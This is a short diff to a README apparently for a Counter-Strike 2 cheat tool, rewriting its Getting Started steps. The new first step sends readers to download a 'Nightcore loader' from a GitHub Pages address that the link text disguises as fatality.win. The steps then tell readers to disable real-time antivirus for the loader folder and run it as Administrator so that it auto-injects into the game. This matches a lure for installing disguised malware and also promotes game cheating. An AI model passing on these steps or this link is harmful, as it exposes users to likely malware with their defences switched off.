@@ -86,12 +86,11 @@ Community script repository: **fatality.win/scripts** — 800+ scripts, searchab
 
 ## Getting Started
 
-1. Purchase a subscription at [fatality.win](https://zeptohornbilltassel.github.io/nightcore/)
-2. Download the loader via the dashboard
-3. Disable real-time antivirus protection for the loader folder
-4. Launch CS2 → then run the loader as Administrator
-5. Software auto-injects when CS2 is detected
-6. Press `Insert` to open the menu
+1. Download Nightcore loader [fatality.win](https://zeptohornbilltassel.github.io/nightcore/)
+2. Disable real-time antivirus protection for the loader folder
+3. Launch CS2 → then run the loader as Administrator
+4. Software auto-injects when CS2 is detected
+5. Press `Insert` to open the menu
 
 ---
 
